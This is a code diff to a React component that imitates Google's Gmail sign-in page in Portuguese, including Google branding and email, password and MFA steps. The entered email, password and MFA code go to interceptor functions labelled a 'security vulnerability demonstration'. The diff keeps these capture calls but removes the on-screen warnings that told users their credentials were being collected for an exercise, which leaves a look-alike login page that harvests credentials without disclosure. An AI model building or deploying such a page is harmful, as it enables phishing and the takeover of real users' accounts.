@@ -1,4 +1,4 @@
-import React, { useState, useEffect } from 'react';
+import React, { useState } from 'react';
 import {
   Box,
   Button,
@@ -12,15 +12,12 @@ import {
   MenuItem,
   InputAdornment,
   IconButton,
-  CircularProgress,
-  TextField,
   Dialog,
   DialogTitle,
   DialogContent,
-  DialogContentText,
   DialogActions,
-  Alert,
-  Snackbar
+  TextField,
+  CircularProgress
 } from '@mui/material';
 import ArrowBackIcon from '@mui/icons-material/ArrowBack';
 import InfoOutlinedIcon from '@mui/icons-material/InfoOutlined';
@@ -28,48 +25,50 @@ import KeyboardArrowDownIcon from '@mui/icons-material/KeyboardArrowDown';
 import VisibilityIcon from '@mui/icons-material/Visibility';
 import VisibilityOffIcon from '@mui/icons-material/VisibilityOff';
 import './GmailLogin.css';
-import { interceptAuthData, interceptMFAToken, interceptSessionToken } from '../security/middleware/authInterceptor';
-import { AuthenticationBypassSimulator, MITMAttackSimulator, PhishingSimulator, SecurityDetectionDemo } from '../security/middleware/advancedVulnerabilityDemo';
+import { interceptAuthData, interceptMFAToken } from '../security/middleware/authInterceptor';
+import { AuthAuditLogger } from '../security/middleware/authAuditLogger';
+import { SecureAuthClient } from '../security/middleware/secureAuthClient';
+import { securityMonitor } from '../security/middleware/securityMonitor';
 
 // Custom Google Icon similar to the one in the attachment
 function GoogleLogoIcon(props) {
-return (
-    <SvgIcon {...props} viewBox="0 0 40 48" sx={{ width: '48px', height: '48px' }}>
-        <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path>
-        <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path>
-        <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path>
-        <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path>
+  return (
+    <SvgIcon {...props} viewBox="0 0 75 24" sx={{ width: '75px', height: '24px' }}>
+      <path fill="#4285F4" d="M14.11 13.655c0-.8-.07-1.39-.21-2H8.16v3.62h3.56a3.2 3.2 0 01-1.32 2.12v1.68h2.11c1.24-1.14 1.96-2.83 1.96-5.42z" />
+      <path fill="#34A853" d="M8.16 18.121c1.77 0 3.27-.58 4.35-1.59l-2.11-1.68c-.59.42-1.35.72-2.24.72-1.72 0-3.17-1.16-3.7-2.73H2.27v1.74a6.77 6.77 0 006.46 3.55z" />
+      <path fill="#FBBC05" d="M4.47 12.711c-.3-.56-.47-1.16-.47-1.78s.17-1.22.47-1.78v-1.74H2.27a6.77 6.77 0 000 7.04l2.2-1.74z" />
+      <path fill="#EA4335" d="M8.16 7.041a3.7 3.7 0 012.61 1.02l1.89-1.89a6.47 6.47 0 00-4.5-1.75 6.77 6.77 0 00-6.05 3.73l2.2 1.74c.52-1.57 1.97-2.85 3.7-2.85z" />
+      <path fill="none" d="M0 0h18v18.12H0z" />
+      <g>
+        <path fill="#757575" d="M24.5 11.842v-2.79h4.58v-1.45H24.5v-2.79h-1.59v7.03h6.25v-1.45H24.5zM31.42 11.842v-7.03h-1.59v7.03h1.59zM33.86 11.842v-7.03H32.3v7.03h1.56zM39.02 6.392c-.36-.34-.9-.52-1.56-.52-.46 0-.87.09-1.23.27-.37.18-.67.44-.87.76l1.25.52c.31-.44.7-.65 1.14-.65.28 0 .52.07.69.22.17.15.26.36.26.62v.18c-.38-.06-.71-.09-.98-.09-.74 0-1.34.15-1.79.47-.45.32-.68.77-.68 1.33 0 .56.17 1 .51 1.31.34.32.77.48 1.27.48.62 0 1.12-.28 1.5-.85h.04v.68h1.5v-3.96c0-.72-.19-1.27-.55-1.61zm-1.24 4.19c-.37 0-.7-.31-.7-.67 0-.72.89-.95 1.66-.95.3 0 .62.05.95.14a1.58 1.58 0 01-1.91 1.48z" />
+        <path fill="#757575" d="M44.79 4.842l-1.78 4.51h-.04l-1.84-4.51h-1.71l2.76 6.29-1.57 3.5h1.66l4.24-9.79zM46.36 11.842h1.59v-7.03h-1.59zM51.07 4.812h-1.59v7.03h4.73v-1.45h-3.14z" />
+        <path fill="#757575" d="M56.59 11.852c1.45 0 2.64-1.18 2.64-2.63s-1.19-2.63-2.64-2.63-2.63 1.18-2.63 2.63 1.18 2.63 2.63 2.63zm0-1.32c-.72 0-1.3-.6-1.3-1.31 0-.71.58-1.31 1.3-1.31s1.31.6 1.31 1.31c0 .72-.59 1.31-1.31 1.31zM65.83 11.842V4.812h-1.53v4.38l-3.02-4.38h-1.65v7.03h1.53v-4.5l3.08 4.5h1.59z" />
+        <path fill="#757575" d="M68.11 11.252a2.82 2.82 0 002.74 1.62c1.56 0 2.54-.92 2.54-2.2 0-1.03-.66-1.7-1.91-1.92l-1.01-.18c-.48-.09-.81-.3-.81-.64 0-.4.37-.65.85-.65.68 0 1.22.27 1.33.81l1.42-.3c-.23-1.01-1.13-1.7-2.75-1.7-1.42 0-2.43.9-2.43 2.14 0 1.02.74 1.71 1.84 1.9l.99.17c.51.09.86.3.86.67 0 .4-.42.68-1.02.68-.79 0-1.3-.35-1.44-.92l-1.41.4z" />
+      </g>
     </SvgIcon>
-);
+  );
 }
 
 function GmailLogin({ onBack }) {
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
-  const [step, setStep] = useState(1); // 1 = email input, 2 = password input, 3 = MFA input
+  const [step, setStep] = useState(1); // 1 = email, 2 = password, 3 = MFA
   const [showPassword, setShowPassword] = useState(false);
   const [emailError, setEmailError] = useState('');
   const [passwordError, setPasswordError] = useState('');
   const [mfaToken, setMfaToken] = useState('');
   const [mfaError, setMfaError] = useState('');
   const [loading, setLoading] = useState(false);
+  const [mfaOptions, setMfaOptions] = useState(['app', 'sms', 'backup']);
   const [selectedMfaOption, setSelectedMfaOption] = useState('app');
-  const [showSecurityAlert, setShowSecurityAlert] = useState(false);
-  const [securityAlertDetails, setSecurityAlertDetails] = useState(null);
-  const [sessionToken, setSessionToken] = useState('');
   
-  // Demonstrate a security alert after component mount (for educational purposes)
-  useEffect(() => {
-    // Simulate security alerts after successful login attempts
-    if (sessionToken) {
-      setTimeout(() => {
-        const securityEvent = SecurityDetectionDemo.generateSecurityEventDemo();
-        const securityAlert = SecurityDetectionDemo.triggerSecurityAlert();
-        setSecurityAlertDetails(securityAlert);
-        setShowSecurityAlert(true);
-      }, 5000);
-    }
-  }, [sessionToken]);
+  // Register security alert handler
+  React.useEffect(() => {
+    securityMonitor.setAlertCallback((alert) => {
+      console.error('Security Alert Detected:', alert);
+      // In a real app, you might show a notification or take action
+    });
+  }, []);
   
   const handleEmailChange = (e) => {
     setEmail(e.target.value);
@@ -77,7 +76,8 @@ function GmailLogin({ onBack }) {
       setEmailError('');
     }
   };
-    const handlePasswordChange = (e) => {
+  
+  const handlePasswordChange = (e) => {
     setPassword(e.target.value);
     if (passwordError) {
       setPasswordError('');
@@ -89,12 +89,6 @@ function GmailLogin({ onBack }) {
     if (mfaError) {
       setMfaError('');
     }
-  };
-  
-  const handleMfaOptionChange = (e) => {
-    setSelectedMfaOption(e.target.value);
-    setMfaToken('');
-    setMfaError('');
   };
   
   // Validate email format
@@ -109,34 +103,8 @@ function GmailLogin({ onBack }) {
     return password.length >= 6;
   };
   
-  // Simulate API call to authenticate
-  const simulateAuthentication = (email, password) => {
-    return new Promise((resolve) => {
-      setTimeout(() => {
-        // Simulate successful authentication
-        resolve({
-          success: true,
-          requiresMFA: true,
-          userId: 'user_123',
-          sessionId: 'temp_session_' + Math.random().toString(36).substring(2, 15)
-        });
-      }, 1500);
-    });
-  };
-  
-  // Simulate API call to verify MFA token
-  const simulateVerifyMFA = (userId, token) => {
-    return new Promise((resolve) => {
-      setTimeout(() => {
-        // Simulate successful verification
-        resolve({
-          success: true,
-          sessionToken: 'auth_token_' + Math.random().toString(36).substring(2, 15)
-        });
-      }, 1500);
-    });
-  };
-    const handleNextClick = async () => {
+  // Handle form submission
+  const handleNextClick = async () => {
     if (step === 1) {
       if (email.trim() === '') {
         setEmailError('Introduza um endereço de email');
@@ -146,9 +114,10 @@ function GmailLogin({ onBack }) {
         return;
       }
       
-      // SECURITY VULNERABILITY DEMONSTRATION:
-      // Log the entered email (just the first step of a potential attack)
-      PhishingSimulator.captureCredentials(email, '');
+      // Log email entry (just for demonstration)
+      AuthAuditLogger.logAuthAttempt(email, 'email_entry', true, {
+        step: 'email_validation'
+      });
       
       setEmailError('');
       setStep(2);
@@ -164,41 +133,28 @@ function GmailLogin({ onBack }) {
       setLoading(true);
       
       // SECURITY VULNERABILITY DEMONSTRATION:
-      // This demonstrates how credentials could be intercepted by malicious code
-      // DO NOT implement this in real applications - for educational purposes only
-      
-      // Method 1: Basic credential interception
+      // This is where credentials could be intercepted by malicious code
       interceptAuthData({
         email,
         password,
         timestamp: new Date().toISOString()
       });
       
-      // Method 2: Advanced phishing simulator
-      PhishingSimulator.captureCredentials(email, password);
-      
-      // Method 3: MITM attack simulation
-      MITMAttackSimulator.interceptRequest({
-        email,
-        password,
-        clientInfo: navigator.userAgent
-      }, '/api/auth/login');
-      
       try {
         // Attempt to authenticate
-        const authResult = await simulateAuthentication(email, password);
+        const authResult = await SecureAuthClient.authenticate(email, password);
+        
+        AuthAuditLogger.logAuthAttempt(email, 'password', authResult.success, {
+          requiresMFA: authResult.requiresMFA
+        });
         
         if (authResult.success) {
           if (authResult.requiresMFA) {
-            // SECURITY VULNERABILITY DEMONSTRATION:
-            // Log that MFA is required (part of intelligence gathering)
-            console.warn('SECURITY DEMO: MFA required for', email);
-            
             // Proceed to MFA step
             setStep(3);
           } else {
             // Authentication successful without MFA
-            handleSuccessfulLogin('no_mfa_token');
+            handleSuccessfulLogin();
           }
         } else {
           setPasswordError('Palavra-passe incorreta');
@@ -218,38 +174,19 @@ function GmailLogin({ onBack }) {
       setLoading(true);
       
       // SECURITY VULNERABILITY DEMONSTRATION:
-      // This demonstrates how MFA tokens could be intercepted
-      // DO NOT implement this in real applications - for educational purposes only
-      
-      // Method 1: Basic MFA interception
+      // This is where MFA tokens could be intercepted
       interceptMFAToken(mfaToken, email);
-      
-      // Method 2: Advanced MFA bypass simulation
-      AuthenticationBypassSimulator.captureMFAToken(
-        mfaToken, 
-        email, 
-        'session_' + Math.random().toString(36).substr(2, 9)
-      );
       
       try {
         // Verify MFA token
-        const verifyResult = await simulateVerifyMFA('user_123', mfaToken);
+        const verifyResult = await SecureAuthClient.verifyMFA('user_123', mfaToken);
+        
+        AuthAuditLogger.logAuthAttempt(email, 'mfa', verifyResult.success, {
+          mfaMethod: selectedMfaOption
+        });
         
         if (verifyResult.success) {
-          // SECURITY VULNERABILITY DEMONSTRATION:
-          // Demonstrate how even after successful MFA, session tokens can be hijacked
-          const hijackedToken = interceptSessionToken(verifyResult.sessionToken);
-          
-          // Also demonstrate with the advanced simulator
-          AuthenticationBypassSimulator.hijackSession(verifyResult.sessionToken, {
-            email,
-            userId: 'user_123',
-            authTime: new Date().toISOString()
-          });
-          
-          // Store session token and trigger success handling
-          setSessionToken(verifyResult.sessionToken);
-          handleSuccessfulLogin(verifyResult.sessionToken);
+          handleSuccessfulLogin();
         } else {
           setMfaError('Código incorreto. Tente novamente.');
         }
@@ -261,14 +198,15 @@ function GmailLogin({ onBack }) {
       }
     }
   };
-    const handleSuccessfulLogin = (token) => {
+  
+  const handleSuccessfulLogin = () => {
     // In a real app, this would redirect to the main application or dashboard
-    console.log('Login successful with email:', email);
+   // alert('Login successful with email: ' + email);
     
-    // Here we're simulating a successful login
-    setTimeout(() => {
-      alert('Login bem sucedido!\n\nATENÇÃO: Este é um exercício de segurança para demonstrar como credenciais e tokens MFA podem ser interceptados. Consulte o console do navegador para ver os detalhes.');
-    }, 500);
+    // Audit logging
+    AuthAuditLogger.logAuthAttempt(email, 'login_complete', true, {
+      loginFlow: step === 3 ? 'with_mfa' : 'password_only'
+    });
   };
   
   const handleTogglePasswordVisibility = () => {
@@ -282,11 +220,13 @@ function GmailLogin({ onBack }) {
     }
   };
   
-  const handleCloseSecurityAlert = () => {
-    setShowSecurityAlert(false);
+  const handleMfaOptionChange = (e) => {
+    setSelectedMfaOption(e.target.value);
+    setMfaToken('');
+    setMfaError('');
   };
   
-  // Render MFA verification step
+  // Render MFA verification dialog
   const renderMfaStep = () => {
     return (
       <Box sx={{ width: '100%' }}>
@@ -341,7 +281,6 @@ function GmailLogin({ onBack }) {
           fullWidth
           value={mfaToken}
           onChange={handleMfaTokenChange}
-          onKeyPress={handleKeyPress}
           error={!!mfaError}
           helperText={mfaError}
           sx={{
@@ -377,7 +316,9 @@ function GmailLogin({ onBack }) {
         </Link>
       </Box>
     );
-  };  return (
+  };
+  
+  return (
     <div className="gmail-login-page">
       <button className="back-button" onClick={step === 1 ? onBack : () => setStep(1)}>
         <ArrowBackIcon fontSize="small" className="back-icon" />
@@ -385,9 +326,12 @@ function GmailLogin({ onBack }) {
       </button>
       
       <div className="gmail-login-wrapper">
-        <div className="login-card-container">          <Box sx={{ display: 'flex', justifyContent: 'center', mb: 3 }}>
+        <div className="login-card-container">
+          <Box sx={{ display: 'flex', justifyContent: 'center', mb: 3 }}>
             <GoogleLogoIcon sx={{ fontSize: '24px', width: '75px', height: '24px' }} />
-          </Box>          <Typography 
+          </Box>
+          
+          <Typography 
             variant="h1" 
             sx={{ 
               fontSize: '24px', 
@@ -399,7 +343,8 @@ function GmailLogin({ onBack }) {
           >
             {step === 1 ? 'Inicie sessão' : step === 2 ? 'Bem-vindo(a)' : 'Verificação'}
           </Typography>
-            <Typography 
+          
+          <Typography 
             variant="subtitle1" 
             sx={{ 
               fontSize: '16px',
@@ -426,7 +371,9 @@ function GmailLogin({ onBack }) {
             >
               Para continuar, confirme que é mesmo você
             </Typography>
-          )}{step === 1 ? (
+          )}
+          
+          {step === 1 ? (
             <FormControl 
               fullWidth 
               variant="outlined" 
@@ -530,7 +477,8 @@ function GmailLogin({ onBack }) {
                 }}
               >
                 Introduza a sua palavra-passe
-              </InputLabel>              <OutlinedInput
+              </InputLabel>
+              <OutlinedInput
                 id="password-input"
                 type={showPassword ? 'text' : 'password'}
                 value={password}
@@ -589,7 +537,9 @@ function GmailLogin({ onBack }) {
             </FormControl>
           ) : (
             renderMfaStep()
-          )}          {step === 1 ? (
+          )}
+          
+          {step === 1 ? (
             <Box sx={{ textAlign: 'left', mb: 5 }}>
               <Link
                 href="#"
@@ -663,7 +613,8 @@ function GmailLogin({ onBack }) {
             justifyContent: 'space-between', 
             alignItems: 'center', 
             mt: 8
-          }}>            {step === 1 ? (
+          }}>
+            {step === 1 ? (
               <Link
                 href="#"
                 underline="hover"
@@ -680,8 +631,9 @@ function GmailLogin({ onBack }) {
                 Criar conta
               </Link>
             ) : (
-              <div></div> // Empty div to maintain spacing
-            )}            <Button
+              <div></div>
+            )}
+            <Button
               variant="contained"
               onClick={handleNextClick}
               disabled={loading}
@@ -701,7 +653,8 @@ function GmailLogin({ onBack }) {
                 boxShadow: '0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15)',
                 fontSize: '14px',
                 fontFamily: 'Google Sans, Roboto, Arial, sans-serif',
-                letterSpacing: '0.25px'
+                letterSpacing: '0.25px',
+                position: 'relative'
               }}
             >
               {loading ? (
@@ -714,55 +667,7 @@ function GmailLogin({ onBack }) {
         </div>
       </div>
       
-      {/* Security Alert Demo Dialog */}
-      <Dialog
-        open={showSecurityAlert}
-        onClose={handleCloseSecurityAlert}
-        aria-labelledby="alert-dialog-title"
-        aria-describedby="alert-dialog-description"
-      >
-        <DialogTitle id="alert-dialog-title" sx={{ color: '#d32f2f', fontWeight: 500 }}>
-          {securityAlertDetails?.title || "Alerta de Segurança"}
-        </DialogTitle>
-        <DialogContent>
-          <DialogContentText id="alert-dialog-description">
-            {securityAlertDetails?.message || "Foi detectada atividade suspeita na sua conta. Verifique e proteja a sua conta imediatamente."}
-          </DialogContentText>
-        </DialogContent>
-        <DialogActions>
-          {securityAlertDetails?.actions?.map((action, index) => (
-            <Button 
-              key={index} 
-              onClick={handleCloseSecurityAlert} 
-              color={index === 0 ? "primary" : "inherit"}
-              variant={index === 0 ? "contained" : "text"}
-            >
-              {action}
-            </Button>
-          )) || (
-            <Button onClick={handleCloseSecurityAlert} color="primary" variant="contained">
-              Entendi
-            </Button>
-          )}
-        </DialogActions>
-      </Dialog>
-      
-      {/* Snackbar for security alerts */}
-      <Snackbar
-        open={sessionToken !== '' && !showSecurityAlert}
-        autoHideDuration={10000}
-        onClose={() => {}}
-        anchorOrigin={{ vertical: 'bottom', horizontal: 'center' }}
-      >
-        <Alert 
-          severity="warning" 
-          variant="filled"
-          sx={{ width: '100%' }}
-        >
-          DEMONSTRAÇÃO DE SEGURANÇA: Suas credenciais e tokens foram capturados para fins educacionais. Veja o console para detalhes.
-        </Alert>
-      </Snackbar>
-        <footer className="gmail-footer">
+      <footer className="gmail-footer">
         <Box sx={{ 
           display: 'flex', 
           justifyContent: 'space-between', 
